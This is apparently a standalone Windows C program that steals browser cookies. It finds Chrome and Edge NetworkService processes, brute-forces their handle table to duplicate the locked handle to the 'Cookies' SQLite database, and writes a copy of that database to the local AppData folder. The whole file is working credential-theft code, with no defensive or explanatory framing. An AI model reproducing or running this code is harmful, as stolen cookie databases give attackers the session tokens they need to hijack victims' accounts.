#include <windows.h>
#include <winternl.h>
#include <Shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <wincrypt.h>
#include <tlhelp32.h>

BOOL IsNetworkService(DWORD PID);
VOID GetProcessPIDByName(CHAR *processName);
VOID CopyDatabaseBruteForceHandleByPID(DWORD PID);

BOOL IsNetworkService(DWORD PID) {

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb;
    RTL_USER_PROCESS_PARAMETERS rupp;
    SIZE_T dwBytesRead = 0;

    FARPROC NtQueryInformationProcess = GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryInformationProcess");
    NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

    ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(PEB), &dwBytesRead);
    ReadProcessMemory(hProc, peb.ProcessParameters, &rupp, sizeof(RTL_USER_PROCESS_PARAMETERS), &dwBytesRead);

    WCHAR *commandline = (WCHAR*)GlobalAlloc(GPTR, rupp.CommandLine.Length + 1);

    ReadProcessMemory(hProc, rupp.CommandLine.Buffer, commandline, rupp.CommandLine.Length, &dwBytesRead);
    CloseHandle(hProc);

    if(wcsstr(commandline, L"NetworkService")) {
       return TRUE;
    }
    return FALSE;
}

VOID GetProcessPIDByName(CHAR *processName) {
    printf("Looking for process name %s\n", processName);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)) {
        do {
            if(strcmp(pe32.szExeFile, processName) == 0) {
                CopyDatabaseBruteForceHandleByPID(pe32.th32ProcessID);
            }
        } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}

VOID CopyDatabaseBruteForceHandleByPID(DWORD PID) {
    DWORD i = 0x100;
    if(!IsNetworkService(PID)) {
        return;
    }
    printf("Process PID %d is the NetworkService aka the one with an handle to the cookie\n", PID);

    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
    if(hProc == INVALID_HANDLE_VALUE) {
        printf("Failed to get an handle on process PID %d\n", PID);
        return;
    }

    for(i; i < 0x1000; i++) {
        HANDLE hDuplicate = NULL;
        if(DuplicateHandle(hProc, (HANDLE)i, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
            FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
            CHAR filename[256];
            ZeroMemory(filename, 256);
            GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
            if(strstr(filename, "Cookies") != NULL && strstr(filename, "Cookies-journal") == NULL && strstr(filename, "Browsing Cookies") == NULL) {
                printf("Cookie SQLite db found %s\n", filename);

                CHAR appdata[256];
                DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
                DWORD dwRead = 0;
                CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);

                SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);

                printf("Cookie SQLite db file size is %d\n", dwFileSize);

                ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

                memset(filename, 0x00, 256);

                SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
                snprintf(filename, 256, "%s\\%d.db", appdata, PID);
                printf("File saved as %s\n", filename);

                HANDLE hFile = CreateFile(filename, GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                CloseHandle(hFile);
                GlobalFree(buffer);

                CloseHandle(hDuplicate);
                CloseHandle(hProc);
                return;
            }
        }
    }
    CloseHandle(hProc);
}


int main() {

    GetProcessPIDByName("chrome.exe");
    GetProcessPIDByName("msedge.exe");
    printf("Process completed.\n");
    return 0;
}
